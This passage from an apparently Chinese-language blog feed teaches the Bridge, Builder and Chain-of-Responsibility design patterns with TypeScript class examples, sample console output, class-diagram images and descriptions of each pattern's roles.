<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h5 id="Display-ts-负责“显示”的类"><a href="#Display-ts-负责“显示”的类" class="headerlink" title="Display.ts 负责“显示”的类"></a>Display.ts 负责“显示”的类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import DisplayImpl from &quot;.&#x2F;DisplayImpl&quot;;</span><br><span class="line"></span><br><span class="line">export default class Display &#123;</span><br><span class="line">    private impl: DisplayImpl;</span><br><span class="line">    constructor(impl: DisplayImpl) &#123;</span><br><span class="line">        this.impl &#x3D; impl;</span><br><span class="line">    &#125;</span><br><span class="line">    public open(): void &#123;</span><br><span class="line">        this.impl.rawOpen();</span><br><span class="line">    &#125;</span><br><span class="line">    public print(): void &#123;</span><br><span class="line">        this.impl.rawPrint();</span><br><span class="line">    &#125;</span><br><span class="line">    public close(): void &#123;</span><br><span class="line">        this.impl.rawClose();</span><br><span class="line">    &#125;</span><br><span class="line">    public display(): void &#123;</span><br><span class="line">        this.open();</span><br><span class="line">        this.print();</span><br><span class="line">        this.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="CountDisplay-ts-增加了“只显示规定次数”这一功能的类"><a href="#CountDisplay-ts-增加了“只显示规定次数”这一功能的类" class="headerlink" title="CountDisplay.ts 增加了“只显示规定次数”这一功能的类"></a>CountDisplay.ts 增加了“只显示规定次数”这一功能的类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Display from &quot;.&#x2F;Display&quot;;</span><br><span class="line">import DisplayImpl from &quot;.&#x2F;DisplayImpl&quot;;</span><br><span class="line"></span><br><span class="line">export default class CountDisplay extends Display &#123;</span><br><span class="line">    constructor(impl: DisplayImpl) &#123;</span><br><span class="line">        super(impl);</span><br><span class="line">    &#125;</span><br><span class="line">    public multiDisplay(times: number) &#123;</span><br><span class="line">        this.open();</span><br><span class="line">        for (let i &#x3D; 0; i &lt; times; i++) &#123;</span><br><span class="line">            this.print();</span><br><span class="line">        &#125;</span><br><span class="line">        this.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="DisplayImpl-ts-负责“显示”的类"><a href="#DisplayImpl-ts-负责“显示”的类" class="headerlink" title="DisplayImpl.ts 负责“显示”的类"></a>DisplayImpl.ts 负责“显示”的类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export default abstract class DisplayImpl &#123;</span><br><span class="line">    abstract rawOpen(): void;</span><br><span class="line">    abstract rawPrint(): void;</span><br><span class="line">    abstract rawClose(): void;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="StringDisplayImpl-ts-“用字符串显示”的类"><a href="#StringDisplayImpl-ts-“用字符串显示”的类" class="headerlink" title="StringDisplayImpl.ts “用字符串显示”的类"></a>StringDisplayImpl.ts “用字符串显示”的类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import DisplayImpl from &quot;.&#x2F;DisplayImpl&quot;;</span><br><span class="line"></span><br><span class="line">export default class StringDisplayImpl extends DisplayImpl &#123;</span><br><span class="line">    private str: string;</span><br><span class="line">    private width: number;</span><br><span class="line">    constructor(str: string) &#123;</span><br><span class="line">        super();</span><br><span class="line">        this.str &#x3D; str;</span><br><span class="line">        this.width &#x3D; str.length;</span><br><span class="line">    &#125;</span><br><span class="line">    public rawOpen(): void &#123;</span><br><span class="line">        this.printLine();</span><br><span class="line">    &#125;</span><br><span class="line">    public rawPrint(): void &#123;</span><br><span class="line">        console.log(&#96;|$&#123;this.str&#125;|&#96;);</span><br><span class="line">    &#125;</span><br><span class="line">    public rawClose(): void &#123;</span><br><span class="line">        this.printLine();</span><br><span class="line">    &#125;</span><br><span class="line">    private printLine(): void &#123;</span><br><span class="line">        let str &#x3D; &#39;+&#39;;</span><br><span class="line">        for (let i &#x3D; 0; i &lt; this.width; i++) &#123;</span><br><span class="line">            str &#x3D; str + &#39;-&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        console.log(&#96;$&#123;str&#125;+&#96;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="index-ts"><a href="#index-ts" class="headerlink" title="index.ts"></a>index.ts</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Display from &quot;.&#x2F;Display&quot;;</span><br><span class="line">import StringDisplayImpl from &quot;.&#x2F;StringDisplayImpl&quot;;</span><br><span class="line">import CountDisplay from &quot;.&#x2F;CountDisplay&quot;;</span><br><span class="line"></span><br><span class="line">const d1 &#x3D; new Display(new StringDisplayImpl(&quot;Hello,China.&quot;));</span><br><span class="line">const d2 &#x3D; new CountDisplay(new StringDisplayImpl(&quot;Hello,World.&quot;));</span><br><span class="line">const d3 &#x3D; new CountDisplay(new StringDisplayImpl(&quot;Hello,Universe.&quot;));</span><br><span class="line">console.log(&quot;-------d1.display()--------&quot;)</span><br><span class="line">d1.display();</span><br><span class="line">console.log(&quot;-------d2.display()--------&quot;)</span><br><span class="line">d2.display();</span><br><span class="line">console.log(&quot;-------d3.display()--------&quot;)</span><br><span class="line">d3.display();</span><br><span class="line">console.log(&quot;-------d4.display()--------&quot;)</span><br><span class="line">d3.multiDisplay(5);</span><br></pre></td></tr></table></figure>
<h5 id="result"><a href="#result" class="headerlink" title="result"></a>result</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-------d1.display()--------</span><br><span class="line">+------------+</span><br><span class="line">|Hello,China.|</span><br><span class="line">+------------+</span><br><span class="line">-------d2.display()--------</span><br><span class="line">+------------+</span><br><span class="line">|Hello,World.|</span><br><span class="line">+------------+</span><br><span class="line">-------d3.display()--------</span><br><span class="line">+---------------+</span><br><span class="line">|Hello,Universe.|</span><br><span class="line">+---------------+</span><br><span class="line">-------d3.multiDisplay()--------</span><br><span class="line">+---------------+</span><br><span class="line">|Hello,Universe.|</span><br><span class="line">|Hello,Universe.|</span><br><span class="line">|Hello,Universe.|</span><br><span class="line">|Hello,Universe.|</span><br><span class="line">|Hello,Universe.|</span><br><span class="line">+---------------+</span><br></pre></td></tr></table></figure>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://upload-images.jianshu.io/upload_images/10024246-9af2691e6e770c44.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h2><ul>
<li>Abstraction（抽象化）<br>该角色位于“类的功能层次结构”的最上层，它使用Implement角色的方法定义了基本功能。该角色中保存了Implement角色的示例。在示例中，由Display类扮演该角色</li>
<li>RefinedAbstract（改善后的抽象化）<br>在Abstraction角色的基础上增加了新的角色。在示例中，由CountDisplay类扮演该角色</li>
<li>Implementor（实现者）<br>该角色位于“类的实现层次结构”的最上层。它定义了用于实现Abstraction角色的接口方法。在示例中，由DisplayImpl类扮演此角色</li>
<li>ConcreteImplementor（具体实现者）<br>该角色负责实现在Implement角色中定义的接口。在示例中，由StringDisplayImpl类扮演该角色</li>
</ul>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>Builder-Pattern（建造者模式）</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Builder-Pattern%EF%BC%88%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F%EF%BC%89/</url>
    <content><![CDATA[<p><strong>建造者模式（Builder Pattern）：</strong>组装具有复杂结构的实例。这种类型的设计模式属于创建型模式。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
<li><strong>意图：</strong>将一个复杂的构建与其表示相分离，使得同样的构建过程可以创建不同的表示。</li>
<li><strong>主要解决：</strong>主要解决在软件系统中，有时候面临着”一个复杂对象”的创建工作，其通常由各个部分的子对象用一定的算法构成；由于需求的变化，这个复杂对象的各个部分经常面临着剧烈的变化，但是将它们组合在一起的算法却相对稳定。</li>
<li><strong>何时使用：</strong>一些基本部件不会变，而其组合经常变化的时候。</li>
<li><strong>应用实例：</strong> 去肯德基，汉堡、可乐、薯条、炸鸡翅等是不变的，而其组合是经常变化的，生成出所谓的”套餐”。</li>
<li><strong>优点：</strong><br>1、建造者独立，易扩展。<br>2、便于控制细节风险。</li>
<li><strong>缺点：</strong><br>1、产品必须有共同点，范围有限制。<br>2、如内部变化复杂，会有很多的建造类。</li>
<li><strong>使用场景：</strong><br>1、需要生成的对象具有复杂的内部结构。<br>2、需要生成的对象内部属性本身相互依赖。</li>
</ul>
<blockquote>
<p>注意事项：与工厂模式的区别是：建造者模式更加关注与零件装配的顺序。</p>
</blockquote>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>type.ts 定义食物接口和包装接口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 食物接口</span><br><span class="line"> *&#x2F;</span><br><span class="line">export interface Food &#123;</span><br><span class="line">    name(): string;</span><br><span class="line">    packing(): Packing;</span><br><span class="line">    price(): number;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;**</span><br><span class="line"> * 包装接口</span><br><span class="line"> *&#x2F;</span><br><span class="line">export interface Packing &#123;</span><br><span class="line">    pack(): string</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Wrapper.ts 纸质包装类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Packing &#125; from &quot;.&#x2F;type&quot;;</span><br><span class="line"></span><br><span class="line">export default class Wrapper implements Packing &#123;</span><br><span class="line">    public pack(): string &#123;</span><br><span class="line">        return &quot;Wrapper&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Bottle.ts 定义瓶装类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Packing &#125; from &quot;.&#x2F;type&quot;;</span><br><span class="line"></span><br><span class="line">export default class Bottle implements Packing &#123;</span><br><span class="line">    public pack(): string &#123;</span><br><span class="line">        return &quot;Bottle&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Burger.ts 实现食物接口没定义包装为纸质</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Food, Packing &#125; from &quot;.&#x2F;type&quot;;</span><br><span class="line">import Wrapper from &quot;.&#x2F;Wrapper&quot;;</span><br><span class="line"></span><br><span class="line">export default abstract class Burger implements Food &#123;</span><br><span class="line">    public abstract name(): string;</span><br><span class="line">    public packing(): Packing &#123;</span><br><span class="line">        return new Wrapper();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public abstract price(): number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ColdDrink.ts 冷饮类实现食物接口，并指定包装为瓶装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Food, Packing &#125; from &quot;.&#x2F;type&quot;;</span><br><span class="line">import Bottle from &quot;.&#x2F;Bottle&quot;;</span><br><span class="line"></span><br><span class="line">export default abstract class ColdDrink implements Food &#123;</span><br><span class="line">    public abstract name(): string;</span><br><span class="line">    public packing(): Packing &#123;</span><br><span class="line">        return new Bottle();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public abstract price(): number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>VegBurger.ts 蔬菜汉堡类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Burger from &quot;.&#x2F;Burger&quot;;</span><br><span class="line"></span><br><span class="line">export default class VegBurger extends Burger &#123;</span><br><span class="line">    public price(): number &#123;</span><br><span class="line">        return 25;</span><br><span class="line">    &#125;</span><br><span class="line">    public name(): string &#123;</span><br><span class="line">        return &quot;Veg Burger&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ChickenBurger.ts 鸡肉堡类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Burger from &quot;.&#x2F;Burger&quot;;</span><br><span class="line"></span><br><span class="line">export default class ChickenBurger extends Burger &#123;</span><br><span class="line"></span><br><span class="line">    public price(): number &#123;</span><br><span class="line">        return 50.5;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public name(): string &#123;</span><br><span class="line">        return &quot;Chicken Burger&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Pepsi.ts 百事饮料类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import ColdDrink from &quot;.&#x2F;ColdDrink&quot;;</span><br><span class="line"></span><br><span class="line">export default class Pepsi extends ColdDrink &#123;</span><br><span class="line"></span><br><span class="line">    public price(): number &#123;</span><br><span class="line">        return 35.0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public name(): string &#123;</span><br><span class="line">        return &quot;Pepsi&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Coke.ts 可口可乐类继承自冷饮</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import ColdDrink from &quot;.&#x2F;ColdDrink&quot;;</span><br><span class="line"></span><br><span class="line">export default class Coke extends ColdDrink &#123;</span><br><span class="line"></span><br><span class="line">    public price(): number &#123;</span><br><span class="line">        return 30.0;</span><br><span class="line">    &#125;</span><br><span class="line">    public name(): string &#123;</span><br><span class="line">        return &quot;Coke&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Meal.ts 套餐类，里面有食物和总价</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Food &#125; from &quot;.&#x2F;type&quot;;</span><br><span class="line"></span><br><span class="line">export default class Meal &#123;</span><br><span class="line">    private items &#x3D; new Array&lt;Food&gt;();</span><br><span class="line"></span><br><span class="line">    public addItem(item: Food): void &#123;</span><br><span class="line">        this.items.push(item);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public getCost(): number &#123;</span><br><span class="line">        let cost &#x3D; 0;</span><br><span class="line">        for (const item of this.items) &#123;</span><br><span class="line">            cost +&#x3D; item.price();</span><br><span class="line">        &#125;</span><br><span class="line">        return cost;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public showItems(): void &#123;</span><br><span class="line">        for (const item of this.items) &#123;</span><br><span class="line">            console.log(&#96;Food : $&#123;item.name()&#125;, Packing : $&#123;item.packing().pack()&#125;, Price : $&#123;item.price()&#125;&#96;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>MealBuilder.ts 创建套餐，有蔬菜和没蔬菜的套餐</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Meal from &quot;.&#x2F;Meal&quot;;</span><br><span class="line">import VegBurger from &quot;.&#x2F;VegBurger&quot;;</span><br><span class="line">import Coke from &quot;.&#x2F;Coke&quot;;</span><br><span class="line">import ChickenBurger from &quot;.&#x2F;ChickenBurger&quot;;</span><br><span class="line">import Pepsi from &quot;.&#x2F;Pepsi&quot;;</span><br><span class="line"></span><br><span class="line">export default class MealBuilder &#123;</span><br><span class="line"></span><br><span class="line">    public prepareVegMeal(): Meal &#123;</span><br><span class="line">        const meal &#x3D; new Meal();</span><br><span class="line">        meal.addItem(new VegBurger());</span><br><span class="line">        meal.addItem(new Coke());</span><br><span class="line">        return meal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public prepareNonVegMeal(): Meal &#123;</span><br><span class="line">        const meal &#x3D; new Meal();</span><br><span class="line">        meal.addItem(new ChickenBurger());</span><br><span class="line">        meal.addItem(new Pepsi());</span><br><span class="line">        return meal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>index.ts </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import MealBuilder from &quot;.&#x2F;MealBuilder&quot;;</span><br><span class="line"></span><br><span class="line">const mealBuilder &#x3D; new MealBuilder();</span><br><span class="line"></span><br><span class="line">const vegMeal &#x3D; mealBuilder.prepareVegMeal();</span><br><span class="line">console.log(&quot;-----Veg Meal-------&quot;);</span><br><span class="line">vegMeal.showItems();</span><br><span class="line">console.log(&quot;Total Cost: &quot; + vegMeal.getCost());</span><br><span class="line"></span><br><span class="line">const nonVegMeal &#x3D; mealBuilder.prepareNonVegMeal();</span><br><span class="line">console.log(&quot;-----Non-Veg Meal-----&quot;);</span><br><span class="line">nonVegMeal.showItems();</span><br><span class="line">console.log(&quot;Total Cost: &quot; + nonVegMeal.getCost());</span><br></pre></td></tr></table></figure>
<p>result</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----Veg Meal-------</span><br><span class="line">Food : Veg Burger, Packing : Wrapper, Price : 25</span><br><span class="line">Food : Coke, Packing : Bottle, Price : 30</span><br><span class="line">Total Cost: 55</span><br><span class="line">-----Non-Veg Meal-----</span><br><span class="line">Food : Chicken Burger, Packing : Wrapper, Price : 50.5</span><br><span class="line">Food : Pepsi, Packing : Bottle, Price : 35</span><br><span class="line">Total Cost: 85.5</span><br></pre></td></tr></table></figure>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://upload-images.jianshu.io/upload_images/10024246-b5a8ab23b145195d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h2><ul>
<li>Builder（建造者）<br>Builder角色负责定义用于生产实例的接口，Builder角色中有用于生产实例的方法</li>
<li>ConcreteBuilder(具体的建造者)<br>ConcreteBuilder角色时负责实现Builder角色的接口的类，定义了在生产实例时实际被调用的犯法，此外，在ConcreteBuilder中还定义了获取最终生产结果的方法</li>
<li>Director（监工）<br>Director角色负责使用Builder角色的接口来生产实例，不依赖于ConcreteBuilder角色。它只调用在Builder角色中被定义的方法</li>
<li>Client（使用者）<br>该角色使用了Builder模式。</li>
</ul>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>Chain-of-Responsibility模式（责任链模式）</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Chain-of-Responsibility%E6%A8%A1%E5%BC%8F%EF%BC%88%E8%B4%A3%E4%BB%BB%E9%93%BE%E6%A8%A1%E5%BC%8F%EF%BC%89/</url>
    <content><![CDATA[<p><strong>责任链模式（Chain of Responsibility Pattern）</strong>：多个对象组成一条职责链，然后按照它们在职责链上的顺序处理请求。这种模式给予请求的类型，对请求的发送者和接收者进行解耦。这种类型的设计模式属于行为型模式。<br>在这种模式中，通常每个接收者都包含对另一个接收者的引用。如果一个对象不能处理该请求，那么它会把相同的请求传给下一个接收者，依此类推。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
<li><strong>意图：</strong>发送者与接收者解耦，让多个对象都有可能接收请求，将这些对象连接成一条链，并且沿着这条链传递请求，直到有对象处理它为止。</li>
<li><strong>主要解决：</strong>职责链上的处理者负责处理请求，发送者无须关心请求的处理细节和请求的传递。</li>
<li><strong>何时使用：</strong>在处理消息的时候以过滤很多道。</li>
<li><strong>如何解决：</strong>拦截的类都实现统一接口。</li>
<li><strong>应用实例：</strong>JS 中的事件冒泡</li>
<li>**优点： **<br>1、降低耦合度<br>2、简化了对象。使得对象不需要知道链的结构。<br>3、增强给对象指派职责的灵活性。通过改变链内的成员或者调动它们的次序，允许动态地新增或者删除责任。<br>4、增加新的请求处理类很方便。</li>
<li><strong>缺点：</strong><br>1、不能保证请求一定被接收。<br>2、系统性能将受到一定影响，而且在进行代码调试时不太方便，可能会造成循环调用。<br>3、可能不容易观察运行时的特征，有碍于除错。</li>
</ul>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h5 id="Trouble-ts-表示发生问题的类，带有事件编号"><a href="#Trouble-ts-表示发生问题的类，带有事件编号" class="headerlink" title="Trouble.ts 表示发生问题的类，带有事件编号"></a>Trouble.ts 表示发生问题的类，带有事件编号</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export default class Trouble &#123;</span><br><span class="line">    private num: number;&#x2F;&#x2F;问题编号</span><br><span class="line">    constructor(num: number) &#123;&#x2F;&#x2F;生产问题</span><br><span class="line">        this.num &#x3D; num;</span><br><span class="line">    &#125;</span><br><span class="line">    public toString(): string &#123;</span><br><span class="line">        return &#96;[Trouble $&#123;this.num&#125;]&#96;</span><br><span class="line">    &#125;</span><br><span class="line">    public getNum(): number &#123;</span><br><span class="line">        return this.num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="Support-ts-解决问题的抽象类"><a href="#Support-ts-解决问题的抽象类" class="headerlink" title="Support.ts 解决问题的抽象类"></a>Support.ts 解决问题的抽象类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Trouble from &quot;.&#x2F;Trouble&quot;;</span><br><span class="line"></span><br><span class="line">export default abstract class Support &#123;</span><br><span class="line">    private name: string;</span><br><span class="line">    private next: Support;</span><br><span class="line">    constructor(name: string) &#123;</span><br><span class="line">        this.name &#x3D; name;</span><br><span class="line">    &#125;</span><br><span class="line">    public setNext(next: Support): Support &#123;</span><br><span class="line">        this.next &#x3D; next;</span><br><span class="line">        return next;</span><br><span class="line">    &#125;</span><br><span class="line">    public support(trouble: Trouble): void &#123;</span><br><span class="line">        if (this.resolve(trouble)) &#123;</span><br><span class="line">            this.done(trouble);</span><br><span class="line">        &#125; else if (this.next !&#x3D; null) &#123;</span><br><span class="line">            this.next.support(trouble);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            this.fail(trouble);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public toString(): string &#123;</span><br><span class="line">        return &#96;[$&#123;this.name&#125;]&#96;;</span><br><span class="line">    &#125;</span><br><span class="line">    protected abstract resolve(trouble: Trouble): boolean;</span><br><span class="line">    protected done(trouble: Trouble): void &#123;&#x2F;&#x2F;解决</span><br><span class="line">        console.log(&#96;$&#123;trouble.toString()&#125; is resolved by $&#123;this.toString()&#125;&#96;);</span><br><span class="line">    &#125;</span><br><span class="line">    protected fail(trouble: Trouble): void &#123;&#x2F;&#x2F;未解决</span><br><span class="line">        console.log(&#96;$&#123;trouble.toString()&#125; canot be resolved&#96;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="NoSpport-ts-用于解决问题的类（永不解决）"><a href="#NoSpport-ts-用于解决问题的类（永不解决）" class="headerlink" title="NoSpport.ts 用于解决问题的类（永不解决）"></a>NoSpport.ts 用于解决问题的类（永不解决）</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Support from &quot;.&#x2F;Support&quot;;</span><br><span class="line">import Trouble from &quot;.&#x2F;Trouble&quot;;</span><br><span class="line"></span><br><span class="line">export default class NoSupport extends Support &#123;</span><br><span class="line">    constructor(name: string) &#123;</span><br><span class="line">        super(name);</span><br><span class="line">    &#125;</span><br><span class="line">    protected resolve(trouble: Trouble): boolean &#123;&#x2F;&#x2F;解决问题的方法</span><br><span class="line">        return false;                             &#x2F;&#x2F;自己不处理</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="LimitSupport-ts-用于解决问题的类（仅解决编号小于指定值的问题）"><a href="#LimitSupport-ts-用于解决问题的类（仅解决编号小于指定值的问题）" class="headerlink" title="LimitSupport.ts 用于解决问题的类（仅解决编号小于指定值的问题）"></a>LimitSupport.ts 用于解决问题的类（仅解决编号小于指定值的问题）</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Support from &quot;.&#x2F;Support&quot;;</span><br><span class="line">import Trouble from &quot;.&#x2F;Trouble&quot;;</span><br><span class="line"></span><br><span class="line">export default class LimitSupport extends Support &#123;</span><br><span class="line">    private limit: number;</span><br><span class="line">    constructor(name: string, limit: number) &#123;</span><br><span class="line">        super(name);</span><br><span class="line">        this.limit &#x3D; limit;</span><br><span class="line">    &#125;</span><br><span class="line">    protected resolve(trouble: Trouble): boolean &#123;&#x2F;&#x2F;解决问题的方法</span><br><span class="line">        if (trouble.getNum() &lt; this.limit) &#123;</span><br><span class="line">            return true;&#x2F;&#x2F;正常应该为解决问题的方法</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return false;                             &#x2F;&#x2F;自己不处理</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="OddSupport-ts-用于解决问题的类（仅解决奇数编号的问题）"><a href="#OddSupport-ts-用于解决问题的类（仅解决奇数编号的问题）" class="headerlink" title="OddSupport.ts 用于解决问题的类（仅解决奇数编号的问题）"></a>OddSupport.ts 用于解决问题的类（仅解决奇数编号的问题）</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Support from &quot;.&#x2F;Support&quot;;</span><br><span class="line">import Trouble from &quot;.&#x2F;Trouble&quot;;</span><br><span class="line">&#x2F;**</span><br><span class="line"> * 解决奇数问题</span><br><span class="line"> *&#x2F;</span><br><span class="line">export default class OddSupport extends Support &#123;</span><br><span class="line">    constructor(name: string) &#123;</span><br><span class="line">        super(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected resolve(trouble: Trouble): boolean &#123;&#x2F;&#x2F;解决问题的方法</span><br><span class="line">        if (trouble.getNum() % 2 &#x3D;&#x3D; 1) &#123;</span><br><span class="line">            return true;&#x2F;&#x2F;正常应该为解决问题的方法</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return false;                             &#x2F;&#x2F;自己不处理</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="SpecialSupport-ts-用于解决问题的类（仅解决指定编号的问题）"><a href="#SpecialSupport-ts-用于解决问题的类（仅解决指定编号的问题）" class="headerlink" title="SpecialSupport.ts 用于解决问题的类（仅解决指定编号的问题）"></a>SpecialSupport.ts 用于解决问题的类（仅解决指定编号的问题）</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Support from &quot;.&#x2F;Support&quot;;</span><br><span class="line">import Trouble from &quot;.&#x2F;Trouble&quot;;</span><br><span class="line"></span><br><span class="line">export default class SpecialSupport extends Support &#123;</span><br><span class="line">    private num: number;</span><br><span class="line">    constructor(name: string, num: number) &#123;</span><br><span class="line">        super(name);</span><br><span class="line">        this.num &#x3D; num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected resolve(trouble: Trouble): boolean &#123;&#x2F;&#x2F;解决问题的方法</span><br><span class="line">        if (trouble.getNum() &#x3D;&#x3D; this.num) &#123;</span><br><span class="line">            return true;&#x2F;&#x2F;正常应该为解决问题的方法</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return false;                             &#x2F;&#x2F;自己不处理</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="index-ts"><a href="#index-ts" class="headerlink" title="index.ts"></a>index.ts</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import NoSupport from &quot;.&#x2F;NoSupport&quot;;</span><br><span class="line">import Support from &quot;.&#x2F;Support&quot;;</span><br><span class="line">import LimitSupport from &quot;.&#x2F;LimitSupport&quot;;</span><br><span class="line">import SpecialSupport from &quot;.&#x2F;SpecialSupport&quot;;</span><br><span class="line">import OddSupport from &quot;.&#x2F;OddSupport&quot;;</span><br><span class="line">import Trouble from &quot;.&#x2F;Trouble&quot;;</span><br><span class="line"></span><br><span class="line">const alice: Support &#x3D; new NoSupport(&quot;Alice&quot;);</span><br><span class="line">const bob: Support &#x3D; new LimitSupport(&quot;Bob&quot;, 100);</span><br><span class="line">const charlie: Support &#x3D; new SpecialSupport(&quot;Charlie&quot;, 429);</span><br><span class="line">const diana: Support &#x3D; new LimitSupport(&quot;Diana&quot;, 200);</span><br><span class="line">const elmo: Support &#x3D; new OddSupport(&quot;Elmo&quot;);</span><br><span class="line">const fred: Support &#x3D; new LimitSupport(&quot;Fred&quot;, 300);</span><br><span class="line"></span><br><span class="line">alice.setNext(bob).setNext(charlie).setNext(diana).setNext(elmo).setNext(fred);</span><br><span class="line">for (let i &#x3D; 0; i &lt; 500; i +&#x3D; 33) &#123;</span><br><span class="line">    alice.support(new Trouble(i));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
